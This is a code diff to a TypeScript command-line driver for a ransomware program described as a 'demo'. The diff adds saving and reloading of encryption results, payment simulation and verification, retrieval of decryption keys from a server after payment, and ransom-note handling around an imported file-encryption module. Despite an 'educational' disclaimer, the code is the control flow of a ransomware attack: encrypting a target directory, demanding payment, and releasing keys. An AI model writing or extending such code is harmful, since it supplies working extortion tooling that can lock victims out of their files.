@@ -1,12 +1,30 @@
 import path from 'path'
+import fs from 'fs'
 import { createInterface } from 'readline'
 import {
     encryptTargetFiles,
     decryptFiles,
     simulatePayment,
     verifyPayment,
-    createPaymentReceipt
+    createPaymentReceipt,
+    saveEncryptionResults,
+    loadEncryptionResults,
+    encryptionResultsExist,
+    EncryptionResults,
+    openRansomNote
 } from './ransomware'
+
+// Create a promise-based readline question function
+function question(
+    rl: ReturnType<typeof createInterface>,
+    query: string
+): Promise<string> {
+    return new Promise((resolve) => {
+        rl.question(query, (answer) => {
+            resolve(answer)
+        })
+    })
+}
 
 // Create readline interface for user input
 const rl = createInterface({
@@ -15,19 +33,7 @@ const rl = createInterface({
 })
 
 // Store the encryption results for later decryption
-let encryptionResults: {
-    victimId: string
-    encryptedAESKey: Buffer
-    attackerPrivateKey: string
-    encryptedFiles: string[]
-    encryptionStats: {
-        totalFiles: number
-        totalSize: number
-        encryptionTime: number
-        targetExtensions: string[]
-        timestamp: Date
-    }
-} | null = null
+let encryptionResults: EncryptionResults | null = null
 
 // Main function to run the demo
 async function runRansomwareDemo() {
@@ -41,14 +47,13 @@ async function runRansomwareDemo() {
     console.log(
         'in a controlled environment. It should NEVER be used for malicious purposes.\n'
     )
-
     console.log('Select an operation:')
     console.log('1. Encrypt files (TEST MODE - Safe for demonstration)')
     console.log('2. Decrypt files (requires previous encryption)')
     console.log('3. Simulate full attack lifecycle')
-    console.log('4. Exit\n')
-
-    rl.question('Enter your choice (1-4): ', async (choice) => {
+    console.log('4. Load encryption results from file')
+    console.log('5. Exit\n')
+    rl.question('Enter your choice (1-5): ', async (choice) => {
         switch (choice) {
             case '1':
                 await runEncryption()
@@ -60,6 +65,9 @@ async function runRansomwareDemo() {
                 await runFullLifecycle()
                 break
             case '4':
+                await loadEncryptionResultsFromFile()
+                break
+            case '5':
                 console.log('\nExiting program. Goodbye!')
                 rl.close()
                 break
@@ -83,7 +91,11 @@ async function runEncryption() {
             )
 
             // Run the encryption process
-            encryptionResults = await encryptTargetFiles(targetDir, true)
+            encryptionResults = await encryptTargetFiles(targetDir, true) // Save encryption results to a file
+            const resultsPath = saveEncryptionResults(
+                encryptionResults,
+                targetDir
+            )
 
             console.log(`\nEncryption complete!`)
             console.log(`Victim ID: ${encryptionResults.victimId}`)
@@ -103,14 +115,136 @@ async function runEncryption() {
             console.log(
                 '\nA ransom note has been created in the target directory.'
             )
-            console.log(
-                'To decrypt the files, use option 2 from the main menu.\n'
-            )
+            console.log(`Encryption results saved to: ${resultsPath}`)
 
-            // Return to main menu
-            rl.question('Press Enter to return to the main menu...', () => {
-                runRansomwareDemo()
-            })
+            // Ask if user wants to simulate payment immediately
+            rl.question(
+                '\nWould you like to simulate payment now? (y/n): ',
+                async (answer) => {
+                    if (answer.toLowerCase() === 'y') {
+                        console.log('\n=== PAYMENT SIMULATION ===')
+
+                        try {
+                            // Simulate payment
+                            const { transactionId } = await simulatePayment(
+                                encryptionResults.victimId
+                            )
+                            console.log(
+                                `Payment simulation: Transaction ID ${transactionId}`
+                            )
+
+                            // Verify payment
+                            const verified = await verifyPayment(
+                                transactionId,
+                                encryptionResults.victimId
+                            )
+                            console.log(
+                                `Payment verification: ${
+                                    verified ? 'Successful' : 'Failed'
+                                }`
+                            )
+
+                            if (verified) {
+                                // Create payment receipt
+                                await createPaymentReceipt(
+                                    encryptionResults.victimId,
+                                    transactionId,
+                                    targetDir
+                                )
+                                console.log(
+                                    'Payment receipt created in the target directory.'
+                                )
+
+                                // Ask if user wants to decrypt now
+                                rl.question(
+                                    '\nWould you like to decrypt files now? (y/n): ',
+                                    async (decAnswer) => {
+                                        if (decAnswer.toLowerCase() === 'y') {
+                                            console.log('\nDecrypting files...')
+
+                                            try {
+                                                // Request decryption credentials after payment verification
+                                                const {
+                                                    requestDecryptionCredentials
+                                                } = require('./ransomware/keyManager')
+                                                const decryptionCreds =
+                                                    await requestDecryptionCredentials(
+                                                        encryptionResults.victimId,
+                                                        transactionId
+                                                    )
+
+                                                if (!decryptionCreds.success) {
+                                                    throw new Error(
+                                                        'Failed to obtain decryption credentials from server'
+                                                    )
+                                                }
+
+                                                // Decrypt files using the private key from server
+                                                const decryptedFiles =
+                                                    await decryptFiles(
+                                                        targetDir,
+                                                        encryptionResults.encryptedAESKey,
+                                                        decryptionCreds.privateKey ||
+                                                            encryptionResults.attackerPrivateKey
+                                                    )
+
+                                                console.log(
+                                                    `\nDecryption complete! ${decryptedFiles.length} files restored.`
+                                                )
+                                            } catch (decryptError) {
+                                                console.error(
+                                                    `\nError during decryption: ${decryptError}`
+                                                )
+                                            }
+                                        }
+
+                                        // Return to main menu
+                                        rl.question(
+                                            '\nPress Enter to return to the main menu...',
+                                            () => {
+                                                runRansomwareDemo()
+                                            }
+                                        )
+                                    }
+                                )
+                            } else {
+                                console.log(
+                                    '\nPayment verification failed. Files remain encrypted.'
+                                )
+                                // Return to main menu
+                                rl.question(
+                                    '\nPress Enter to return to the main menu...',
+                                    () => {
+                                        runRansomwareDemo()
+                                    }
+                                )
+                            }
+                        } catch (error) {
+                            console.error(
+                                `\nError during payment process: ${error}`
+                            )
+                            // Return to main menu
+                            rl.question(
+                                '\nPress Enter to return to the main menu...',
+                                () => {
+                                    runRansomwareDemo()
+                                }
+                            )
+                        }
+                    } else {
+                        console.log(
+                            'To decrypt the files later, use option 2 from the main menu.\n'
+                        )
+                        // Return to main menu
+                        rl.question(
+                            'Press Enter to return to the main menu...',
+                            () => {
+                                runRansomwareDemo()
+                            }
+                        )
+                    }
+                }
+            )
         } catch (err) {
             console.error(`\nError during encryption: ${err}`)
             rl.question('Press Enter to return to the main menu...', () => {
@@ -124,47 +258,97 @@ async function runEncryption() {
 async function runDecryption() {
     console.log('\n=== DECRYPTION PROCESS ===\n')
 
-    if (!encryptionResults) {
-        console.log(
-            'No encryption has been performed yet. Please encrypt files first.'
-        )
-        rl.question('Press Enter to return to the main menu...', () => {
-            runRansomwareDemo()
-        })
-        return
-    }
-
     rl.question('Enter the target directory path: ', async (targetDir) => {
         try {
             console.log(`\nTarget directory: ${targetDir}`)
-            console.log('Decrypting files...\n')
 
-            // Simulate payment
-            const { transactionId } = simulatePayment(
-                encryptionResults.victimId
+            // Check if encryption results exist in memory or need to be loaded from file
+            let currentEncryptionResults = encryptionResults
+
+            // If no encryption results in memory, try to load from file
+            if (!currentEncryptionResults) {
+                if (encryptionResultsExist(targetDir)) {
+                    console.log('Loading encryption results from file...')
+                    try {
+                        currentEncryptionResults =
+                            loadEncryptionResults(targetDir)
+                        console.log(
+                            `Loaded encryption results for victim ID: ${currentEncryptionResults.victimId}`
+                        )
+                    } catch (loadError) {
+                        console.error(
+                            `Error loading encryption results: ${loadError}`
+                        )
+                        rl.question(
+                            'Press Enter to return to the main menu...',
+                            () => {
+                                runRansomwareDemo()
+                            }
+                        )
+                        return
+                    }
+                } else {
+                    console.log(
+                        'No encryption results found. Please encrypt files first or provide a directory with existing results.'
+                    )
+                    rl.question(
+                        'Press Enter to return to the main menu...',
+                        () => {
+                            runRansomwareDemo()
+                        }
+                    )
+                    return
+                }
+            }
+            console.log('Decrypting files...\n') // Simulate payment
+            const { transactionId } = await simulatePayment(
+                currentEncryptionResults.victimId
             )
             console.log(`Payment simulation: Transaction ID ${transactionId}`)
 
             // Verify payment
-            const verified = verifyPayment(transactionId)
+            const verified = await verifyPayment(
+                transactionId,
+                currentEncryptionResults.victimId
+            )
             console.log(
                 `Payment verification: ${verified ? 'Successful' : 'Failed'}`
             )
 
             if (verified) {
                 // Create payment receipt
-                createPaymentReceipt(
-                    encryptionResults.victimId,
+                await createPaymentReceipt(
+                    currentEncryptionResults.victimId,
                     transactionId,
                     targetDir
                 )
                 console.log('Payment receipt created in the target directory.')
 
-                // Decrypt files
+                // Request decryption credentials after payment verification
+                const {
+                    requestDecryptionCredentials
+                } = require('./ransomware/keyManager')
+                const decryptionCreds = await requestDecryptionCredentials(
+                    currentEncryptionResults.victimId,
+                    transactionId
+                )
+
+                if (!decryptionCreds.success) {
+                    throw new Error(
+                        'Failed to obtain decryption credentials from server'
+                    )
+                }
+
+                console.log(
+                    'Successfully retrieved decryption credentials from the server.'
+                )
+
+                // Decrypt files using the private key from server
                 const decryptedFiles = await decryptFiles(
                     targetDir,
-                    encryptionResults.encryptedAESKey,
-                    encryptionResults.attackerPrivateKey
+                    currentEncryptionResults.encryptedAESKey,
+                    decryptionCreds.privateKey ||
+                        currentEncryptionResults.attackerPrivateKey
                 )
 
                 console.log(`\nDecryption complete!`)
@@ -175,6 +359,16 @@ async function runDecryption() {
                 console.log(
                     'The ransom note and metadata files have been removed.\n'
                 )
+
+                // Delete encryption results file after successful decryption
+                const resultsPath = path.join(
+                    targetDir,
+                    'encryption_results.dat'
+                )
+                if (fs.existsSync(resultsPath)) {
+                    fs.unlinkSync(resultsPath)
+                    console.log('Encryption results file deleted.')
+                }
             } else {
                 console.log(
                     '\nPayment verification failed. Files will not be decrypted.\n'
@@ -207,6 +401,13 @@ async function runFullLifecycle() {
             console.log('STEP 1: Encryption Process\n')
             encryptionResults = await encryptTargetFiles(targetDir, true)
 
+            // Save encryption results to file
+            const resultsPath = saveEncryptionResults(
+                encryptionResults,
+                targetDir
+            )
+            console.log(`Encryption results saved to: ${resultsPath}`)
+
             console.log(`\nEncryption complete!`)
             console.log(`Victim ID: ${encryptionResults.victimId}`)
             console.log(
@@ -226,37 +427,79 @@ async function runFullLifecycle() {
                 '\nA ransom note has been created in the target directory.'
             )
 
-            // Step 2: Payment Simulation
+            // Step 1.5: Demonstrate loading encryption results from file
+            console.log('\nSTEP 1.5: Demonstrating Persistence\n')
+            console.log(
+                'Clearing encryption results from memory and loading from file...'
+            )
+
+            // Clear in-memory results to simulate a new session
+            const victimId = encryptionResults.victimId
+            encryptionResults = null
+
+            // Load results from file
+            if (encryptionResultsExist(targetDir)) {
+                console.log('Loading encryption results from saved file...')
+                encryptionResults = loadEncryptionResults(targetDir, victimId)
+                console.log(
+                    `Successfully loaded encryption results for victim ID: ${encryptionResults.victimId}`
+                )
+            } else {
+                console.error('Failed to find encryption results file.')
+                throw new Error('Persistence demonstration failed')
+            } // Step 2: Payment Simulation
             console.log('\nSTEP 2: Payment Simulation\n')
-            const { transactionId } = simulatePayment(
+            const { transactionId } = await simulatePayment(
                 encryptionResults.victimId
             )
-            console.log(`Payment simulation: Transaction ID ${transactionId}`)
-
-            // Step 3: Payment Verification
+            console.log(`Payment simulation: Transaction ID ${transactionId}`) // Step 3: Payment Verification
             console.log('\nSTEP 3: Payment Verification\n')
-            const verified = verifyPayment(transactionId)
+            const verified = await verifyPayment(
+                transactionId,
+                encryptionResults.victimId
+            )
             console.log(
                 `Payment verification: ${verified ? 'Successful' : 'Failed'}`
-            )
-
-            // Step 4: Decryption
+            ) // Step 4: Decryption
             console.log('\nSTEP 4: Decryption Process\n')
 
             if (verified) {
                 // Create payment receipt
-                createPaymentReceipt(
+                await createPaymentReceipt(
                     encryptionResults.victimId,
                     transactionId,
                     targetDir
                 )
                 console.log('Payment receipt created in the target directory.')
 
-                // Decrypt files
+                // Step 5: Requesting Decryption Credentials
+                console.log('\nSTEP 5: Requesting Decryption Credentials\n')
+
+                // Request decryption credentials after payment verification
+                const {
+                    requestDecryptionCredentials
+                } = require('./ransomware/keyManager')
+                const decryptionCreds = await requestDecryptionCredentials(
+                    encryptionResults.victimId,
+                    transactionId
+                )
+
+                if (!decryptionCreds.success) {
+                    throw new Error(
+                        'Failed to obtain decryption credentials from server'
+                    )
+                }
+
+                console.log(
+                    'Successfully retrieved decryption credentials from the server.'
+                )
+
+                // Decrypt files using the private key from server
                 const decryptedFiles = await decryptFiles(
                     targetDir,
                     encryptionResults.encryptedAESKey,
-                    encryptionResults.attackerPrivateKey
+                    decryptionCreds.privateKey ||
+                        encryptionResults.attackerPrivateKey
                 )
 
                 console.log(`\nDecryption complete!`)
@@ -267,6 +510,16 @@ async function runFullLifecycle() {
                 console.log(
                     'The ransom note and metadata files have been removed.\n'
                 )
+
+                // Delete encryption results file after successful decryption
+                const resultsPath = path.join(
+                    targetDir,
+                    'encryption_results.dat'
+                )
+                if (fs.existsSync(resultsPath)) {
+                    fs.unlinkSync(resultsPath)
+                    console.log('Encryption results file deleted.')
+                }
             } else {
                 console.log(
                     '\nPayment verification failed. Files will not be decrypted.\n'
@@ -286,6 +539,59 @@ async function runFullLifecycle() {
             })
         }
     })
+}
+
+// Function to load encryption results from a file
+async function loadEncryptionResultsFromFile() {
+    console.log('\n=== LOAD ENCRYPTION RESULTS ===\n')
+
+    rl.question(
+        'Enter the directory containing encryption results: ',
+        async (directory) => {
+            try {
+                if (encryptionResultsExist(directory)) {
+                    console.log('Loading encryption results from file...')
+
+                    encryptionResults = loadEncryptionResults(directory)
+
+                    console.log(`\nEncryption results loaded successfully!`)
+                    console.log(`Victim ID: ${encryptionResults.victimId}`)
+                    console.log(
+                        `Files encrypted: ${encryptionResults.encryptedFiles.length}`
+                    )
+                    console.log(
+                        `Total data encrypted: ${(
+                            encryptionResults.encryptionStats.totalSize /
+                            (1024 * 1024)
+                        ).toFixed(2)} MB`
+                    )
+                    console.log(
+                        `Encryption timestamp: ${encryptionResults.encryptionStats.timestamp.toLocaleString()}`
+                    )
+                    console.log(
+                        '\nYou can now use option 2 from the main menu to decrypt the files.\n'
+                    )
+                } else {
+                    console.log(
+                        `\nNo encryption results found in directory: ${directory}`
+                    )
+                    console.log(
+                        'Please check the directory path and try again.\n'
+                    )
+                }
+
+                // Return to main menu
+                rl.question('Press Enter to return to the main menu...', () => {
+                    runRansomwareDemo()
+                })
+            } catch (err) {
+                console.error(`\nError loading encryption results: ${err}`)
+                rl.question('Press Enter to return to the main menu...', () => {
+                    runRansomwareDemo()
+                })
+            }
+        }
+    )
 }
 
 // Start the demo
